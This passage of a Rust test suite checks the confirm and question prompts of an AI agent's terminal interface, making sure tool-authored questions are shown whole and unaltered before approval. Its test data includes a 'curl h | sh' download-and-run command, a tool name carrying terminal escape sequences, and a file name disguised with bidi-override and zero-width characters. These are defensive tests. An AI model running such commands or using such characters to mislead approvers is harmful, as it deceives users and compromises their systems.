    assert!(!queued.is_finished());
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        queued.join().unwrap().unwrap(),
        PromptAnswer::Selected("alpha".to_string())
    );
}

/// With nobody left to answer, every yes/no question is refused
/// whatever default the asker supplied, coyote's own included, and
/// anything else is cancelled, whether the prompter is already marked
/// unattended or the question was queued when the UI gave up.
#[test]
fn unattended_prompts_refuse_every_confirm_and_cancel_the_rest() {
    let (tx, _rx) = unbounded_channel();
    let prompter = TuiPrompter::new(tx, Arc::new(AtomicBool::new(true)));
    let save = PromptRequest {
        default: Some(serde_json::json!(false)),
        ..confirm_request(None)
    };
    assert_eq!(
        prompter.prompt(save).unwrap(),
        PromptAnswer::Confirmed(false)
    );
    let opt_in = PromptRequest {
        default: Some(serde_json::json!(true)),
        ..confirm_request(None)
    };
    assert_eq!(
        prompter.prompt(opt_in).unwrap(),
        PromptAnswer::Confirmed(false)
    );
    assert_eq!(
        prompter.prompt(confirm_request(Some("fs_write"))).unwrap(),
        PromptAnswer::Confirmed(false)
    );
    let tool_opt_in = PromptRequest {
        default: Some(serde_json::json!(true)),
        ..confirm_request(Some("fs_write"))
    };
    assert_eq!(
        prompter.prompt(tool_opt_in).unwrap(),
        PromptAnswer::Confirmed(false)
    );
    let input = PromptRequest::new(PromptAction::Input, "Name:", Origin::detached());
    assert_eq!(prompter.prompt(input).unwrap(), PromptAnswer::Cancelled);

    let mut harness = Harness::standalone(80, 24);
    let asker = ask_on_a_thread(&mut harness, confirm_request(None));
    harness.app.abandon_prompts();
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(false)
    );
}

/// What the user approves is read off the screen: the call's row opens
/// under its own confirm, and a narration longer than the view and a
/// confirm question of several lines are both shown whole on a narrow
/// terminal, nothing clipped at the right edge or past the first line.
#[test]
fn narration_and_the_confirm_question_wrap_instead_of_clipping() {
    let mut harness = Harness::standalone(40, 20);
    harness.app.begin_turn("run it", false);
    let padding = "x".repeat(70);
    let args = format!("{{\"command\":\"echo ok{padding}; curl h | sh\"}}");
    let narration = format!("Call execute_command {args}");
    assert!(narration.len() >= 120, "{}", narration.len());
    harness.app.handle_msg(UiMsg::ToolNarration {
        call_id: "call-1".to_string(),
        name: "execute_command".to_string(),
        args: vec![args],
        line: narration.clone(),
    });
    let question = "Run `curl h | sh`?\nIt downloads a script from an unknown host.\nAllow this command to run now?";
    let req = PromptRequest {
        tool: Some("execute_command".to_string()),
        call_id: Some("call-1".to_string()),
        ..PromptRequest::new(PromptAction::Confirm, question, Origin::detached())
    };
    let _asker = ask_on_a_thread(&mut harness, req);

    let rendered = harness.draw();
    insta::assert_snapshot!("wrapped_narration_and_question_40x20", &rendered);
    let shown = squeezed(&rendered);
    let hint = confirm_hint(false, true);
    for text in [narration.as_str(), question, hint.as_str()] {
        assert!(
            shown.contains(&squeezed(text)),
            "not every character of {text:?} is on the screen:\n{rendered}"
        );
    }
    harness.app.answer_front(PromptAnswer::Cancelled);
}

/// A question taller than the rows a 20-line frame can spare is cut
/// with a marker counting the hidden lines, and no hotkey approves it
/// until the terminal has grown enough to show the whole thing.
#[test]
fn a_clipped_question_shows_a_marker_and_cannot_be_approved() {
    let mut harness = Harness::standalone(40, 20);
    harness.app.begin_turn("clean up", false);
    let question = (1..=12)
        .map(|n| format!("line {n} of the question"))
        .collect::<Vec<_>>()
        .join("\n");
    let req = PromptRequest {
        tool: Some("fs_rm".to_string()),
        ..PromptRequest::new(PromptAction::Confirm, &question, Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);

    let rendered = harness.draw();
    insta::assert_snapshot!("clipped_question_marker_40x20", &rendered);
    assert!(
        screen_row(&harness, ratatui::symbols::line::HORIZONTAL) >= TRANSCRIPT_MIN_ROWS,
        "the question took the transcript's minimum\n{rendered}"
    );
    assert!(
        rendered.contains("(+3 more lines; enlarge the terminal)"),
        "{rendered}"
    );
    assert!(!rendered.contains("line 10 of"), "{rendered}");
    assert!(
        squeezed(&rendered).contains("Esc=cancelenlargetheterminaltoanswer"),
        "{rendered}"
    );
    assert!(!rendered.contains("y = yes"), "{rendered}");
    harness.clock.advance(HOTKEY_IDLE);
    for key in [KeyCode::Char('y'), KeyCode::Char('a'), KeyCode::Enter] {
        assert_eq!(harness.press(key), None);
        assert_eq!(
            harness.app.prompts.len(),
            1,
            "{key:?} answered a clipped question"
        );
    }
    assert!(!asker.is_finished());

    harness.resize(40, 24);
    let rendered = harness.draw();
    assert!(!rendered.contains("more lines"), "{rendered}");
    assert!(
        squeezed(&rendered).contains(&squeezed(&question)),
        "{rendered}"
    );
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
}

/// A short confirm whose help text alone outgrows a 12-row frame is
/// clipped like a tall question: the legend offers only Esc and no
/// hotkey approves it until the terminal grows.
#[test]
fn a_confirm_whose_help_outgrows_a_short_frame_offers_only_esc() {
    let mut harness = Harness::standalone(80, 12);
    harness.app.begin_turn("reinstall", false);
    let help = (1..=8)
        .map(|n| format!("help sentence {n} explains what the reinstall overwrites and keeps"))
        .collect::<Vec<_>>()
        .join(" ");
    let req = PromptRequest {
        help: Some(help),
        default: Some(serde_json::json!(false)),
        ..PromptRequest::new(PromptAction::Confirm, "Continue?", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);

    let rendered = harness.draw();
    assert!(
        squeezed(&rendered).contains(&squeezed(CLIPPED_HINT)),
        "{rendered}"
    );
    assert!(!rendered.contains("y = yes"), "{rendered}");
    harness.clock.advance(HOTKEY_IDLE);
    for key in [KeyCode::Char('y'), KeyCode::Enter] {
        assert_eq!(harness.press(key), None);
        assert_eq!(
            harness.app.prompts.len(),
            1,
            "{key:?} answered a clipped confirm"
        );
    }
    assert!(!asker.is_finished());

    harness.resize(80, 30);
    let rendered = harness.draw();
    assert!(rendered.contains("help sentence 8"), "{rendered}");
    assert!(!rendered.contains("enlarge the terminal"), "{rendered}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
}

/// A frame too short for status, modal and footer squeezes the
/// question below the rows its cap promised; the rows it actually
/// received decide, so nothing approves it until the terminal grows.
#[test]
fn a_question_squeezed_by_a_tiny_frame_cannot_be_approved() {
    let mut harness = Harness::standalone(40, 5);
    harness.app.begin_turn("clean up", false);
    let question = "line 1 of the question\nline 2 of the question\nline 3 of the question";
    let req = PromptRequest {
        tool: Some("fs_rm".to_string()),
        ..PromptRequest::new(PromptAction::Confirm, question, Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    harness.draw();
    let given = harness.app.question_area.expect("the modal was drawn");
    assert!(given.height < 3, "{given:?}");
    harness.clock.advance(HOTKEY_IDLE);
    for key in [KeyCode::Char('y'), KeyCode::Char('a'), KeyCode::Enter] {
        assert_eq!(harness.press(key), None);
        assert_eq!(
            harness.app.prompts.len(),
            1,
            "{key:?} answered a squeezed question"
        );
    }
    assert!(!asker.is_finished());

    harness.resize(40, 24);
    let rendered = harness.draw();
    assert!(rendered.contains("line 3 of the question"), "{rendered}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
}

/// The `<tool> asks:` row is the only sign a tool, not Coyote, is
/// asking, so on the smallest frames a tool's question is either
/// drawn with that row or cannot be answered.
#[test]
fn a_tool_question_is_never_answerable_without_its_origin_row() {
    for height in 3..=6 {
        for action in [PromptAction::Confirm, PromptAction::Password] {
            let mut harness = Harness::standalone(40, height);
            harness.app.begin_turn("clean up", false);
            let req = PromptRequest {
                tool: Some("ask_x7x".to_string()),
                ..PromptRequest::new(action, "Go on?", Origin::detached())
            };
            let asker = ask_on_a_thread(&mut harness, req);
            let rendered = harness.draw();
            let labelled = rendered.contains("ask_x7x asks:");
            harness.clock.advance(HOTKEY_IDLE);
            let keys: &[KeyCode] = match action {
                PromptAction::Confirm => &[KeyCode::Char('y')],
                _ => &[KeyCode::Char('p'), KeyCode::Enter],
            };
            for key in keys {
                harness.press(*key);
            }
            let answered = harness.app.prompts.is_empty();
            assert!(
                labelled || !answered,
                "40x{height} {action:?} was answered with no origin row:\n{rendered}"
            );
            assert!(
                labelled
                    || !["y = yes", "Enter = answer", "Enter = choose"]
                        .iter()
                        .any(|offer| rendered.contains(offer)),
                "40x{height} {action:?} offered answers with no origin row:\n{rendered}"
            );
            if !answered {
                harness.press(KeyCode::Esc);
            }
            asker.join().unwrap().unwrap();
        }
    }
}

/// The tool name is drawn as plain text, like the question, so a
/// name cannot carry terminal escapes onto the origin row.
#[test]
fn a_tool_name_is_drawn_without_escape_sequences() {
    let mut harness = Harness::standalone(60, 20);
    harness.app.begin_turn("clean up", false);
    let req = PromptRequest {
        tool: Some("\u{1b}]0;title-x7x\u{7}ask_\u{1b}[2Jx7x".to_string()),
        ..PromptRequest::new(PromptAction::Confirm, "Go on?", Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let rendered = harness.draw();
    assert!(rendered.contains("ask_x7x asks:"), "{rendered}");
    assert!(!rendered.contains("title-x7x"), "{rendered}");
    harness.clock.advance(HOTKEY_IDLE);
    harness.press(KeyCode::Esc);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
}

/// A tool-authored question carrying bidi overrides and zero-width
/// characters reaches the modal with each one spelled out, so none of
/// them can reorder or hide what the user approves.
#[test]
fn a_question_with_format_characters_shows_them_spelled_out() {
    let mut harness = Harness::standalone(100, 20);
    harness.app.begin_turn("remove it", false);
    let req = tool_line_confirm(
        "fs_rm",
        "Delete \u{202E}txt.safe\u{202C} \u{200B}k7m\u{200F}\u{FEFF}?",
    );
    let asker = ask_on_a_thread(&mut harness, req);
    let rendered = harness.draw();
    assert!(
        rendered.contains("Delete \\u{202e}txt.safe\\u{202c} \\u{200b}k7m\\u{200f}\\u{feff}?"),
        "{rendered}"
    );
    for hidden in ['\u{202E}', '\u{202C}', '\u{200B}', '\u{200F}', '\u{FEFF}'] {
        assert!(
            !rendered.contains(hidden),
            "{hidden:?} reached the frame:\n{rendered}"
        );
    }
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Esc), None);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
}

/// A tool-controlled path in the question is shown whole: on 40 columns
/// a 300-character path wraps over several rows and every character of
/// it is on screen before `y` can approve it.
#[test]
fn a_long_path_in_the_confirm_question_is_shown_whole() {
    let mut harness = Harness::standalone(40, 20);
    harness.app.begin_turn("remove it", false);
    let path = format!(
        "/tmp/{}/{}/{}",
        "a".repeat(100),
        "b".repeat(100),
        "c".repeat(93)
    );
    assert_eq!(path.len(), 300);
    let question = format!("Remove '{path}'?");
    let req = PromptRequest {
        tool: Some("fs_rm".to_string()),
        ..PromptRequest::new(PromptAction::Confirm, &question, Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);

    let rendered = harness.draw();
    insta::assert_snapshot!("long_path_confirm_40x20", &rendered);
    assert!(
        squeezed(&rendered).contains(&squeezed(&question)),
        "{rendered}"
    );
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Char('y')), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Confirmed(true)
    );
}

fn escalate(
    queue: &crate::supervisor::escalation::EscalationQueue,
    options: Option<Vec<String>>,
) -> tokio::sync::oneshot::Receiver<String> {
    let (reply_tx, reply_rx) = tokio::sync::oneshot::channel();
    queue.submit(crate::supervisor::escalation::EscalationRequest {
        id: "esc_x7x".to_string(),
        from_agent_id: "agent-x7x".to_string(),
        from_agent_name: "reviewer".to_string(),
        question: "[select] Which branch? x7x".to_string(),
        options,
        reply_tx,
    });
    reply_rx
}

/// Enter on a question's row asks it in the prompt modal, a list
/// over the agent's options; the choice reaches the waiting agent
/// through `reply_escalation`. Esc on the modal leaves it waiting.
#[test]
#[serial]
fn enter_on_a_question_answers_it_through_the_modal() {
    let mut ctx = chat_ctx();
    let queue = ctx.ensure_root_escalation_queue();
    let mut reply = escalate(&queue, Some(vec!["main".to_string(), "dev".to_string()]));
    let mut harness = Harness::for_ctx(&ctx);
    harness.app.sync_from_ctx(&mut ctx);

    harness.app.handle_key(alt(KeyCode::Char('t')));
    let frame = harness.draw();
    assert!(frame.contains("Which branch? x7x"), "{frame}");
    assert!(!frame.contains("[select]"), "{frame}");
    harness.press(KeyCode::Enter);
    let frame = harness.draw();
    assert_welcome_snapshot("escalation_modal_80x24", &frame);
    assert_eq!(
        harness.app.prompts.front().map(PendingPrompt::kind),
        Some(ModalKind::Select {
            custom_field_open: false
        })
    );
    harness.clock.advance(HOTKEY_IDLE);
    harness.press(KeyCode::Esc);
    assert!(queue.has_pending(), "Esc answered the question");
    assert!(reply.try_recv().is_err());

    harness.app.handle_key(alt(KeyCode::Char('t')));
    harness.draw();
    harness.press(KeyCode::Enter);
    harness.clock.advance(HOTKEY_IDLE);
    harness.app.handle_key(ctrl(KeyCode::Char('c')));
    harness.draw();
    assert!(queue.has_pending(), "Ctrl-C answered the question");
    assert!(reply.try_recv().is_err());

    harness.app.handle_key(alt(KeyCode::Char('t')));
    harness.draw();
    harness.press(KeyCode::Enter);
    harness.clock.advance(HOTKEY_IDLE);
    harness.press(KeyCode::Down);
    harness.press(KeyCode::Enter);
    assert_eq!(reply.try_recv().as_deref(), Ok("dev"));
    assert!(!queue.has_pending());
}

#[test]
#[serial]
fn a_question_without_options_takes_typed_text() {
    let mut ctx = chat_ctx();
    let queue = ctx.ensure_root_escalation_queue();
    let mut reply = escalate(&queue, None);
    let mut harness = Harness::for_ctx(&ctx);
    harness.app.sync_from_ctx(&mut ctx);
    harness.app.handle_key(alt(KeyCode::Char('t')));
    harness.draw();
    harness.press(KeyCode::Enter);
    assert_eq!(
        harness.app.prompts.front().map(PendingPrompt::kind),
        Some(ModalKind::Input)
    );
    harness.type_text("release");
    harness.clock.advance(HOTKEY_IDLE);
    harness.press(KeyCode::Enter);
    assert_eq!(reply.try_recv().as_deref(), Ok("release"));
}

/// An asker that stops waiting while its question is open in the
/// modal gets no answer, and the transcript says the reply was lost.
#[test]
#[serial]
fn answering_a_question_whose_asker_is_gone_shows_a_warning() {
    let mut ctx = chat_ctx();
    let queue = ctx.ensure_root_escalation_queue();
    let reply = escalate(&queue, None);
    let mut harness = Harness::for_ctx(&ctx);
    harness.app.sync_from_ctx(&mut ctx);
    harness.app.handle_key(alt(KeyCode::Char('t')));
    harness.draw();
    harness.press(KeyCode::Enter);
    drop(reply);
    harness.type_text("release");
    harness.clock.advance(HOTKEY_IDLE);
    harness.press(KeyCode::Enter);
    assert!(matches!(
        harness.app.transcript.cells().last(),
        Some(Cell::Notice { kind: NoticeKind::ToolWarning, text, .. })
            if text == "The reply was not delivered: agent 'reviewer' stopped waiting on escalation 'esc_x7x'"
    ));
}

/// The `[kind] ` an agent's user tool puts in front of an escalated
/// question names the modal, and the question is shown without it.
#[test]
fn an_escalated_questions_kind_prefix_picks_the_modal() {
    assert_eq!(
        escalation_kind("[checkbox] Which files?"),
        (Some(PromptAction::Checkbox), "Which files?")
    );
    assert_eq!(
        escalation_kind("[confirm] Ship it?"),
        (Some(PromptAction::Confirm), "Ship it?")
    );
    assert_eq!(escalation_kind("[later] plain"), (None, "[later] plain"));
}

/// A confirm escalation asks with the confirm modal and relays `yes`,
/// the way the answer is published everywhere else.
#[test]
#[serial]
fn a_confirm_escalation_relays_yes() {
    let mut ctx = chat_ctx();
    let queue = ctx.ensure_root_escalation_queue();
    let (reply_tx, mut reply) = tokio::sync::oneshot::channel();
    queue.submit(crate::supervisor::escalation::EscalationRequest {
        id: "esc_c4f".to_string(),
        from_agent_id: "agent-c4f".to_string(),
        from_agent_name: "reviewer".to_string(),
        question: "[confirm] Ship it? c4f".to_string(),
        options: None,
        reply_tx,
    });
    let mut harness = Harness::for_ctx(&ctx);
    harness.app.sync_from_ctx(&mut ctx);
    harness.app.handle_key(alt(KeyCode::Char('t')));
    harness.draw();
    harness.press(KeyCode::Enter);
    assert!(matches!(
        harness.app.prompts.front().map(PendingPrompt::kind),
        Some(ModalKind::Confirm { .. })
    ));
    let frame = harness.draw();
    assert!(frame.contains("Ship it? c4f"), "{frame}");
    assert!(!frame.contains("[confirm]"), "{frame}");
    harness.clock.advance(HOTKEY_IDLE);
    harness.press(KeyCode::Char('y'));
    assert_eq!(reply.try_recv().as_deref(), Ok("yes"));
}

/// The rows of the last frame from the first starting with `first` to
/// the first after it starting with `last`, both included.
fn box_rows(harness: &Harness, first: &str, last: &str) -> (u16, u16) {
    let top = screen_row(harness, first);
    let height = harness.terminal.backend().buffer().area.height;
    let bottom = (top..height)
        .find(|y| row_text(harness, *y).starts_with(last))
        .unwrap_or_else(|| panic!("no row starts with {last:?} under {first:?}"));
    (top, bottom)
}

/// Every kind of question is drawn in the composer's box: a rule over
/// its first row and one under its last, the key legend below the box.
/// The draft is out of sight while the question is up and back once it
/// is cancelled.
#[test]
fn every_question_kind_draws_between_the_box_rules_and_hides_the_draft() {
    let rule = ratatui::symbols::line::HORIZONTAL.repeat(80);
    let label = crate::tui::theme::YOUR_TURN_LABEL;
    let labelled_rule = format!(
        "{}{label}",
        ratatui::symbols::line::HORIZONTAL.repeat(80 - label.len())
    );
    let requests = [
        (confirm_request(None), "Proceed? tui-x7x", "y = yes"),
        (
            confirm_request(Some("fs_write")),
            "fs_write asks:",
            "y = yes",
        ),
        (
            PromptRequest::new(PromptAction::Input, "Name? b4x", Origin::detached()),
            "Name? b4x",
            "Enter = answer",
        ),
        (
            PromptRequest::new(PromptAction::Password, "Token? b4x", Origin::detached()),
            "Token? b4x",
            "Enter = answer",
        ),
        (
            list_request(PromptAction::Select, None),
            "Pick one q9d-s",
            "Up/Down = move",
        ),
        (
            list_request(PromptAction::Checkbox, None),
            "Pick one q9d-s",
            "Space = tick",
        ),
    ];
    for (req, first, hint) in requests {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft-z9q");
        let asker = ask_on_a_thread(&mut harness, req);
        let frame = harness.draw();
        assert!(!frame.contains("draft-z9q"), "{first}: {frame}");
        let (top, legend) = box_rows(&harness, first, hint);
        assert_eq!(
            row_text(&harness, top - 1),
            labelled_rule,
            "{first}: {frame}"
        );
        assert_eq!(row_text(&harness, legend - 1), rule, "{first}: {frame}");
        assert!(
            (top..legend - 1).all(|y| row_text(&harness, y) != rule),
            "{first}: a rule inside the box\n{frame}"
        );

        assert_eq!(harness.press(KeyCode::Esc), None);
        assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
        let frame = harness.draw();
        assert!(frame.contains("draft-z9q"), "{first}: {frame}");
        assert_eq!(harness.app.composer_text(), "draft-z9q");
    }
}

/// The question takes the question colour, the options are plain and
/// the option under the cursor is bold and in the highlight colour, so
/// it is told apart by more than bold. `NO_COLOR` keeps only the bold.
#[test]
fn the_question_and_the_highlighted_option_have_colours_of_their_own() {
    for no_color in [false, true] {
        let mut harness = Harness::standalone(80, 24);
        harness.app.set_no_color(no_color);
        let _asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Select, None));
        harness.press(KeyCode::Down);
        harness.draw();
        let question = style_at(&harness, "Pick one q9d-s");
        let plain = style_at(&harness, "  alpha");
        let marked = style_at(&harness, "> beta");
        assert!(marked.1.contains(Modifier::BOLD), "{no_color}");
        assert!(!plain.1.contains(Modifier::BOLD), "{no_color}");
        assert_eq!(plain.0, Color::Reset, "{no_color}");
        if no_color {
            assert_eq!((question.0, marked.0), (Color::Reset, Color::Reset));
        } else {
            assert_eq!(
                question.0,
                Color::Yellow,
                "the REPL question colour with no theme"
            );
            assert_eq!(marked.0, Color::LightCyan);
            assert_ne!(question.0, Color::Reset);
        }
        harness.press(KeyCode::Esc);
    }
}

/// An option wider than the box wraps under its own text, every word
/// of it on screen, and all its rows take the highlight when it is
/// under the cursor.
#[test]
fn a_long_option_wraps_under_its_text() {
    let mut harness = Harness::standalone(40, 24);
    let long = "a rather long option that cannot fit on a single forty column row at all";
    let req = PromptRequest {
        options: vec!["short".to_string(), long.to_string()],
        ..PromptRequest::new(PromptAction::Select, "Which? w2r", Origin::detached())
    };
    let _asker = ask_on_a_thread(&mut harness, req);
    harness.press(KeyCode::Down);
    let frame = harness.draw();
    let first = screen_row(&harness, "> a rather long");
    let rows: Vec<String> = (first..first + 2).map(|y| row_text(&harness, y)).collect();
    assert!(
        rows[1].starts_with("  ") && !rows[1].starts_with("   "),
        "{frame}"
    );
    assert!(rows.iter().all(|row| row.trim_end().len() <= 40), "{frame}");
    let joined: Vec<&str> = rows.iter().flat_map(|row| row.split_whitespace()).collect();
    assert_eq!(joined[1..].join(" "), long, "{frame}");
    let buffer = harness.terminal.backend().buffer();
    for y in first..first + 2 {
        assert!(
            buffer[(2, y)].modifier.contains(Modifier::BOLD),
            "row {y} of the marked option is not highlighted\n{frame}"
        );
    }
    assert!(
        row_text(&harness, first + 2).starts_with(&format!("  {CUSTOM_CHOICE_ROW}")),
        "{frame}"
    );
    assert!(!buffer[(2, first + 2)].modifier.contains(Modifier::BOLD));
    harness.press(KeyCode::Esc);
}

/// The free-text answer behind "Other" wraps as the composer does, the
/// box growing to show all of it.
#[test]
fn the_other_field_wraps_its_text() {
    let mut harness = Harness::standalone(40, 24);
    let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Select, None));
    harness.clock.advance(HOTKEY_IDLE);
    for _ in 0..3 {
        harness.press(KeyCode::Down);
    }
    harness.press(KeyCode::Enter);
    let text = "my own answer is longer than one row of this narrow box";
    harness.type_text(text);
    let frame = harness.draw();
    let first = screen_row(&harness, "my own answer");
    let rows: Vec<String> = (first..first + 2).map(|y| row_text(&harness, y)).collect();
    assert_eq!(
        rows.iter()
            .flat_map(|row| row.split_whitespace())
            .collect::<Vec<_>>()
            .join(" "),
        text,
        "{frame}"
    );
    harness.press(KeyCode::Esc);
    assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
}

/// A long answer grows the field only into rows the question does not
/// need: the question stays whole and Enter still sends the answer.
#[test]
fn a_long_answer_never_cuts_the_question_it_answers() {
    let mut harness = Harness::standalone(80, 24);
    let question = "First line q5f\nsecond line\nthird line\nfourth line q5f";
    let req = PromptRequest {
        origin: Origin {
            agent_id: Some("agent-q5f".to_string()),
            depth: 1,
            node: None,
        },
        ..PromptRequest::new(PromptAction::Input, question, Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let answer = "word ".repeat(200);
    harness.type_text(answer.trim_end());
    let frame = harness.draw();
    for line in question.lines() {
        assert!(frame.contains(line), "{line:?} is cut:\n{frame}");
    }
    assert!(!frame.contains("more lines; enlarge"), "{frame}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Text(answer.trim_end().to_string())
    );
}

/// Long options wrap into many rows but never into the rows the question
/// needs: the list scrolls and Enter still picks the marked option.
#[test]
fn long_options_never_cut_the_question_they_answer() {
    let mut harness = Harness::standalone(80, 24);
    let question = "First line o7c\nsecond line\nthird line\nfourth line o7c";
    let options: Vec<String> = (0..6)
        .map(|n| format!("option {n} {}", "word ".repeat(40).trim_end()))
        .collect();
    let req = PromptRequest {
        options: options.clone(),
        origin: Origin {
            agent_id: Some("agent-o7c".to_string()),
            depth: 1,
            node: None,
        },
        ..PromptRequest::new(PromptAction::Select, question, Origin::detached())
    };
    let asker = ask_on_a_thread(&mut harness, req);
    let frame = harness.draw();
    for line in question.lines() {
        assert!(frame.contains(line), "{line:?} is cut:\n{frame}");
    }
    assert!(!frame.contains("more lines; enlarge"), "{frame}");
    harness.clock.advance(HOTKEY_IDLE);
    assert_eq!(harness.press(KeyCode::Enter), None);
    assert_eq!(
        asker.join().unwrap().unwrap(),
        PromptAnswer::Selected(options[0].clone())
    );
}

/// Coyote's and an agent's questions are rendered as markdown; a tool's
/// stays plain so every character it asks to approve shows, in the same
/// question colour.
#[test]
fn only_a_question_without_a_tool_is_rendered_as_markdown() {
    let source = "Keep `notes` **now**? m3d";
    let agent = Origin {
        agent_id: Some("agent-m3d".to_string()),
        depth: 1,
        node: None,
    };
    for origin in [Origin::detached(), agent] {
        let mut harness = Harness::standalone(80, 24);
        let expected: Vec<String> = harness
            .app
            .renderer
            .markdown_source(source, 80)
            .iter()
            .map(|line| line.to_string().trim_end().to_string())
            .collect();
        assert_ne!(
            expected[0], source,
            "the renderer left the markdown as it was"
        );
        let req = PromptRequest::new(PromptAction::Confirm, source, origin.clone());
        let _asker = ask_on_a_thread(&mut harness, req);
        let frame = harness.draw();
        let row = screen_row(&harness, expected[0].as_str());
        assert_eq!(
            row_text(&harness, row).trim_end(),
            expected[0],
            "{origin:?}\n{frame}"
        );
        assert!(!frame.contains(source), "{origin:?}\n{frame}");
        harness.press(KeyCode::Esc);
    }

    let mut harness = Harness::standalone(80, 24);
    harness.app.set_no_color(false);
    let req = PromptRequest {
        tool: Some("fs_rm".to_string()),
        ..PromptRequest::new(PromptAction::Confirm, source, Origin::detached())
    };
    let _asker = ask_on_a_thread(&mut harness, req);
    let frame = harness.draw();
    assert!(frame.contains(source), "{frame}");
    assert!(frame.contains("fs_rm asks:"), "{frame}");
    let (colour, _) = style_at(&harness, source);
    assert_eq!(colour, Color::Yellow, "the tool's question is not orange");
    harness.press(KeyCode::Esc);
}
